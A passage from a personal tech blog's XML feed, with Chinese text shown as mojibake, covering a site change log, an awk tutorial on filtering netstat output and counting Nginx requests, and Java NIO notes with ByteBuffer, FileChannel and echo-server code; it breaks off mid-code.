        <content type="html"><![CDATA[<h2 id="ç½‘ç«™å˜æ›´å†å²"><a href="#ç½‘ç«™å˜æ›´å†å²" class="headerlink" title="ç½‘ç«™å˜æ›´å†å²"></a>ç½‘ç«™å˜æ›´å†å²</h2><h3 id="2019-06-07"><a href="#2019-06-07" class="headerlink" title="2019-06-07"></a>2019-06-07</h3><ol><li><p>å‡†å¤‡</p><ul><li>æ–°å»ºä»“åº“<a href="https://github.com/tianyk/tianyk.github.io">tianyk&#x2F;tianyk.github.io</a><blockquote><p>GitHubæ”¯æŒä¸¤ç§æ–¹å¼GitHub Pageï¼š</p><ol><li>ä»“åº“åä¸º<code>YOUR_NAME.github.io</code>ï¼Œæ­¤æ–¹å¼è®¿é—®åœ°å€ä¸º<code>YOUR_NAME.github.io</code></li><li>masteråˆ†æ”¯ã€masteråˆ†æ”¯çš„<code>/docs</code>ç›®å½•ã€<code>gh-pages</code>åˆ†æ”¯ï¼Œè¿™ç§æ–¹å¼è®¿é—®åœ°å€ä¸º<code>YOUR_NAME.github.io/REPOSITORY_NAME</code></li></ol></blockquote></li></ul></li><li><p>è¿ç§»ç½‘ç«™åˆ°GitHub Page</p><ol><li><a href="https://hexo.io/zh-cn/docs/deployment.html#Git">é…ç½®</a><code>git</code>æ–¹å¼éƒ¨ç½²</li></ol></li><li><p>ä¿®æ”¹<code>CNAME</code>ä¸º<code>tianyk.github.io</code></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ dig kekek.cc A </span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">kekek.cc.           10      IN   CNAME    tianyk.github.io.</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.110.153</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.109.153</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.108.153</span><br><span class="line">tianyk.github.io.   3600    IN   A        185.199.111.153</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-11-15"><a href="#2018-11-15" class="headerlink" title="2018-11-15"></a>2018-11-15</h3><ol><li><p>â¤ç‚¹å‡»è®°å½•</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source/js/main.js</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-08-25"><a href="#2018-08-25" class="headerlink" title="2018-08-25"></a>2018-08-25</h3><ol><li>include_code æ ‡ç­¾æ”¯æŒä»ç½‘ç»œåŠ è½½ä»£ç  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scripts/include_code.js</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-08-24"><a href="#2018-08-24" class="headerlink" title="2018-08-24"></a>2018-08-24</h3><ol><li><p>åœç”¨AMP</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹ä¸‹è½½ç›®å½•ä¸º<code>downloads</code></p></li></ol><h3 id="2018-07-16"><a href="#2018-07-16" class="headerlink" title="2018-07-16"></a>2018-07-16</h3><ol><li><p>é…ç½®<code>skip_render</code></p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_config.yml</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-07-04"><a href="#2018-07-04" class="headerlink" title="2018-07-04"></a>2018-07-04</h3><ol><li><p>footerå¯¹é½</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cactus/source/css/_partial/footer.styl</span><br></pre></td></tr></table></figure></li></ol><h3 id="2018-07-03"><a href="#2018-07-03" class="headerlink" title="2018-07-03"></a>2018-07-03</h3><ol><li><p>footeréƒ¨åˆ†â¤ç‚¹å‡»</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cactus/layout/_partial/footer.ejs</span><br><span class="line">cactus/source/css/_partial/footer.styl</span><br><span class="line">cactus/source/js/main.js</span><br></pre></td></tr></table></figure></li></ol><p>å‚è€ƒï¼š</p><ul><li><a href="https://medium.com/@chrismabry/how-did-they-do-that-the-twitter-like-animation-2a473b658e43">How Did They Do That? The Twitter â€œLikeâ€ Animation</a></li><li><a href="https://codepen.io/mindstorm/pen/aZZvKq">css | twitter heart animation</a></li><li><a href="http://www.w3cplus.com/animation/recreating-the-twitter-heart-animation.html">é‡æ–°åˆ›å»ºTwitterç‚¹èµåŠ¨æ•ˆ</a></li><li><a href="https://codepen.io/yisi/pen/LpXVJb">Twitter heart button animation</a></li><li><a href="https://blog.prototypr.io/twitter-s-heart-animation-in-full-css-b1c00ca5b774">Twitterâ€™s Heart Animation in Full CSS</a></li></ul><h3 id="2018-06-14"><a href="#2018-06-14" class="headerlink" title="2018-06-14"></a>2018-06-14</h3><ol><li><p>æ·»åŠ åˆ›ä½œè®¸å¯</p><p> é€‰æ‹©è®¸å¯è¯<a href="https://creativecommons.org/choose/">https://creativecommons.org/choose/</a></p></li><li><p>ç½‘ç«™å˜æ›´å¼€å§‹æ·»åŠ ç‰ˆæœ¬</p><p> ä»¥åå‡é‡‡ç”¨æ—¥æœŸä½œä¸ºç‰ˆæœ¬ï¼Œæœ¬æ¬¡ç‰ˆæœ¬ä¸º[20180614]</p></li></ol><h3 id="2018-06-12"><a href="#2018-06-12" class="headerlink" title="2018-06-12"></a>2018-06-12</h3><ol><li><p>æ·»åŠ <a href="/tags/">æ ‡ç­¾</a>å’Œ<a href="/categories/">åˆ†ç±»</a>é¡µé¢</p><ol><li>æ·»åŠ æ–°çš„é¡µé¢ <code>layout/tags.ejs</code></li><li>é€šè¿‡<a href="https://hexo.io/zh-cn/docs/variables.html#%E7%BD%91%E7%AB%99%E5%8F%98%E9%87%8F"><code>site.tags</code></a>è·å–æ‰€æœ‰æ ‡ç­¾</li><li>åˆ›å»ºä¸€ä¸ªæ–°çš„<code>hexo new page &quot;tags&quot;</code></li><li>æ·»åŠ <code>layout: tags</code>åˆ°<code>source/tags/index.md</code>çš„front-matterã€‚</li></ol><blockquote><p>å‚è€ƒ<code>layout/archive.ejs</code></p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://github.com/probberechts/hexo-theme-cactus/issues/35 --&gt;</span><br><span class="line">&lt;div id=&quot;tags&quot;&gt;</span><br><span class="line">    &lt;ul class=&quot;post-list&quot;&gt;</span><br><span class="line">    &lt;% site.tags.each(function(tag) &#123; %&gt;</span><br><span class="line">        &lt;h2&gt;&lt;%= tag.name %&gt;&lt;/h2&gt;</span><br><span class="line">        &lt;% tag.posts.each(function(post) &#123; %&gt;</span><br><span class="line">            &lt;li class=&quot;post-item&quot;&gt;</span><br><span class="line">                &lt;%- partial(&#x27;_partial/post/date&#x27;, &#123; post: post, class_name: &#x27;meta&#x27; &#125;) %&gt;</span><br><span class="line">                &lt;span&gt;&lt;%- partial(&#x27;_partial/post/title&#x27;, &#123; post: post, index: true, class_name: &#x27;&#x27; &#125;) %&gt;&lt;/span&gt;</span><br><span class="line">            &lt;/li&gt;</span><br><span class="line">        &lt;% &#125;); %&gt;</span><br><span class="line">    &lt;% &#125;); %&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>i18n</p><p> <code>themes/cactus/languages/[default|zh-CN].yml</code></p></li><li><p>robots.txt</p><p> æ·»åŠ <code>Disallow: /categories</code></p></li></ol><h3 id="2018-05-03"><a href="#2018-05-03" class="headerlink" title="2018-05-03"></a>2018-05-03</h3><p>æœ¬ç«™ä½¿ç”¨<a href="https://hexo.io/">hexo</a>æ­å»ºï¼Œä½¿ç”¨<a href="https://github.com/probberechts/hexo-theme-cactus">cactus</a>æ¨¡æ¿ã€‚ä½¿ç”¨<a href="https://openresty.org/">Openresty</a>ä½œä¸ºWebæœåŠ¡å™¨ã€‚ç½‘ç«™è¯ä¹¦ä½¿ç”¨<a href="https://letsencrypt.org/">Letâ€™s Encrypt</a>ã€‚æœ¬ç«™æ‰˜ç®¡åœ¨<a href="https://www.vultr.com/?ref=7274958">Vultr</a>ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>awk</title>
      <link href="/post/awk.html"/>
      <url>/post/awk.html</url>
      
        <content type="html"><![CDATA[<h2 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h2><p><img src="/images/awk.jpg"></p><p>awk è¯­æ³•åˆ†<code>BEGIN</code>ã€<code>BODY</code>å’Œ<code>END</code>ä¸‰éƒ¨åˆ†ï¼Œå…¶ä¸­<code>BEGIN</code>å’Œ<code>END</code>å¯ä»¥çœç•¥ã€‚<code>BEGIN</code>å’Œ<code>END</code>åªä¼šæ‰§è¡Œä¸€æ¬¡ï¼Œä¸€èˆ¬ç”¨äºåˆå§‹åŒ–å’Œæ”¶å°¾æ“ä½œï¼Œ<code>BODY</code>éƒ¨åˆ†ä¼šæ¯ä¸€è¡Œéƒ½é‡å¤æ‰§è¡Œã€‚</p><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><ol><li><p>ç›‘å¬IPæ˜¯<code>107.23.80.198</code>çš„æœºå™¨å¯¹HTTPå’ŒHTTPSæœåŠ¡çš„æ‰€æœ‰è¿æ¥</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -t </span><br><span class="line">Active Internet connections (w/o servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 172.22.203.148:https        122.224.64.42:opswmanager   SYN_RECV    </span><br><span class="line">tcp        0      0 172.22.203.148:http         39.106.12.213:45574         ESTABLISHED </span><br><span class="line">tcp        0  17376 172.22.203.148:http         107.23.80.198:52924         ESTABLISHED </span><br><span class="line">tcp        0  27512 172.22.203.148:http         107.23.80.198:52928         ESTABLISHED </span><br><span class="line">tcp        0  34752 172.22.203.148:http         107.23.80.198:52925         ESTABLISHED </span><br><span class="line">tcp        0      0 172.22.203.148:47400        106.11.68.13:http           ESTABLISHED </span><br><span class="line">tcp      381      0 172.22.203.148:45978        100.100.25.3:http           CLOSE_WAIT  </span><br><span class="line">tcp        0  14480 172.22.203.148:http         107.23.80.198:52927         ESTABLISHED </span><br><span class="line">tcp        0    120 172.22.203.148:ssh          107.23.80.198:51439         ESTABLISHED </span><br><span class="line">tcp        0 228784 172.22.203.148:https        107.23.80.198:52921         ESTABLISHED </span><br><span class="line">tcp        0  47784 172.22.203.148:http         107.23.80.198:52929         ESTABLISHED </span><br><span class="line">tcp        0  18824 172.22.203.148:http         107.23.80.198:52926         ESTABLISHED </span><br><span class="line">tcp      401      0 172.22.203.148:34764        106.11.68.13:http           CLOSE_WAIT  </span><br></pre></td></tr></table></figure> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -t | awk <span class="string">&#x27;NR &gt; 2 &#123; if ((match($4, &quot;:https&quot;) || match($4, &quot;:http&quot;)) &amp;&amp; match($5, &quot;107.23.80.198&quot;)) &#123;print&#125;&#125; &#x27;</span></span></span><br><span class="line">tcp        0  36200 172.17.204.148:http         107.23.80.198:53813          ESTABLISHED </span><br><span class="line">tcp        0  13032 172.17.204.148:http         107.23.80.198:53855          ESTABLISHED </span><br><span class="line">tcp        0  34752 172.17.204.148:http         107.23.80.198:53852          ESTABLISHED </span><br><span class="line">tcp        0  15928 172.17.204.148:http         107.23.80.198:53854          ESTABLISHED </span><br><span class="line">tcp        0 169416 172.17.204.148:https        107.23.80.198:52921          ESTABLISHED </span><br><span class="line">tcp        0  17376 172.17.204.148:http         107.23.80.198:53853          ESTABLISHED </span><br><span class="line">tcp        0  26064 172.17.204.148:http         107.23.80.198:53816          ESTABLISHED </span><br></pre></td></tr></table></figure><p> è¿™ä¸ªä¾‹å­ä¸­æ²¡æœ‰<code>BEGIN</code>å’Œ<code>END</code>éƒ¨åˆ†ï¼ˆBEGINå’ŒENDéƒ¨åˆ†éœ€è¦æœ‰è¿™ä¸¤ä¸ªå…³é”®å­— <code>BEGIN {} {} END {}</code>ï¼‰ã€‚<code>NR &gt; 2</code> é¦–å…ˆè·³è¿‡å¤´ä¸¤è¡Œï¼Œmatchç”¨äºå­—ç¬¦ä¸²åŒ¹é…ï¼Œæœ€åçš„printä¼šæ‰“å°æ•´è¡Œï¼ˆåŒ<code>print $0</code>ï¼‰</p></li><li><p>ç»Ÿè®¡Nginxæ¯å¤©çš„è¯·æ±‚é‡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;arr[substr($4, 2, (index($4, &quot;:&quot;) - 2))]++ &#125; END &#123;for (a in arr) print a, arr[a]&#125;&#x27; /var/log/nginx/access.log</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://blog.jobbole.com/109089/">ä¸‰ååˆ†é’Ÿå­¦ä¼šAWK</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> awk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java.io</title>
      <link href="/post/java.io.html"/>
      <url>/post/java.io.html</url>
      
        <content type="html"><![CDATA[<h3 id="ByteBuffer"><a href="#ByteBuffer" class="headerlink" title="ByteBuffer"></a>ByteBuffer</h3><p><a href="https://my.oschina.net/flashsword/blog/159613">ByteBuffer</a> å¯ä»¥åœ¨å †å¤–åˆ†é…å†…å­˜ï¼Œå‡å°‘åƒåœ¾å›æ”¶ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ByteBuffer</span> <span class="variable">byteBuffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">100</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.putInt(<span class="number">1</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putInt capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.putLong(<span class="number">1</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putLong capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.flip();</span><br><span class="line">System.out.printf(<span class="string">&quot;flip capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.getInt();</span><br><span class="line">System.out.printf(<span class="string">&quot;getInt capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.getLong();</span><br><span class="line">System.out.printf(<span class="string">&quot;getLong capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.limit(byteBuffer.capacity());</span><br><span class="line">System.out.printf(<span class="string">&quot;resetLimit capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.put((<span class="type">byte</span>) <span class="number">127</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putByte capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.mark();</span><br><span class="line">System.out.printf(<span class="string">&quot;mark capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.putInt(<span class="number">1</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;putInt capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.reset();</span><br><span class="line">System.out.printf(<span class="string">&quot;reset capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.clear();</span><br><span class="line">System.out.printf(<span class="string">&quot;clear capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.position(<span class="number">13</span>);</span><br><span class="line">System.out.printf(<span class="string">&quot;resetPosition capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">byteBuffer.flip();</span><br><span class="line">System.out.printf(<span class="string">&quot;flip capacity: %d, position: %d, limit: %d\n&quot;</span>, byteBuffer.capacity(), byteBuffer.position(), byteBuffer.limit());</span><br><span class="line">System.out.println(byteBuffer.arrayOffset());</span><br><span class="line">byteBuffer.remaining(); <span class="comment">// return limit - position;</span></span><br><span class="line">byteBuffer.hasRemaining(); <span class="comment">// return position &lt; limit;</span></span><br><span class="line"><span class="keyword">if</span> (byteBuffer.hasRemaining()) byteBuffer.get();</span><br><span class="line"></span><br><span class="line"><span class="comment">//byteBuffer.mark();</span></span><br><span class="line"><span class="comment">//byteBuffer.flip();</span></span><br><span class="line"><span class="comment">//byteBuffer.getInt();</span></span><br><span class="line"><span class="comment">//if (byteBuffer.position() &lt; byteBuffer.limit())</span></span><br><span class="line"><span class="comment">//    byteBuffer.getInt();</span></span><br><span class="line"><span class="comment">//System.out.println(byteBuffer.position());</span></span><br></pre></td></tr></table></figure><h4 id="ByteBuffer-vs-ByteBufï¼ˆNettyï¼‰"><a href="#ByteBuffer-vs-ByteBufï¼ˆNettyï¼‰" class="headerlink" title="ByteBuffer vs ByteBufï¼ˆNettyï¼‰"></a>ByteBuffer vs ByteBufï¼ˆNettyï¼‰</h4><p><a href="http://blog.csdn.net/jeffleo/article/details/69230112">Netty ByteBufå’ŒNio ByteBuffer</a></p><h3 id="Channel"><a href="#Channel" class="headerlink" title="Channel"></a>Channel</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Files.copy(Paths.get(args[0]), Paths.get(args[1]));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">FileChannel</span> <span class="variable">read</span> <span class="operator">=</span> FileChannel.open(Paths.get(args[<span class="number">0</span>]));</span><br><span class="line">        <span class="type">FileChannel</span> <span class="variable">write</span> <span class="operator">=</span> FileChannel.open(Paths.get(args[<span class="number">1</span>]), CREATE, TRUNCATE_EXISTING, WRITE);) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocateDirect(<span class="number">1024</span> * <span class="number">10</span>);</span><br><span class="line">    <span class="keyword">while</span> (-<span class="number">1</span> != read.read(buffer)) &#123;</span><br><span class="line">        buffer.flip();</span><br><span class="line">        write.write(buffer);</span><br><span class="line">        buffer.clear();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ECHO"><a href="#ECHO" class="headerlink" title="ECHO"></a>ECHO</h3><ul><li><p>OIO </p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OIOEchoServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String host;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> port;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> poolSize;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ExecutorService executor;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OIOEchoServer</span><span class="params">(String host, <span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(host, port, Runtime.getRuntime().availableProcessors());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">OIOEchoServer</span><span class="params">(String host, <span class="type">int</span> port, <span class="type">int</span> poolSize)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.host = host;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        <span class="built_in">this</span>.poolSize = poolSize;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.executor = Executors.newFixedThreadPool(poolSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EchoHandler</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Socket socket;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">EchoHandler</span><span class="params">(Socket socket)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.socket = socket;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> socket.getInputStream(); <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> socket.getOutputStream();)&#123;</span><br><span class="line">                <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (-<span class="number">1</span> != (read = in.read(buffer))) &#123;</span><br><span class="line">                    out.write(buffer, <span class="number">0</span>, read);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ignored) &#123; &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>()) &#123;</span><br><span class="line">            server.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(host, port));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// accept é˜»å¡ SO_TIMEOUT 2000ms</span></span><br><span class="line">            <span class="comment">//server.setSoTimeout(2000);</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> server.accept();</span><br><span class="line">                    executor.submit(<span class="keyword">new</span> <span class="title class_">EchoHandler</span>(socket));</span><br><span class="line">                &#125; <span class="keyword">catch</span> (SocketTimeoutException ignored) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;timeout&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">OIOEchoServer</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8080</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>NIO </p><p>  <img src="/images/nio-selector.png"></p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 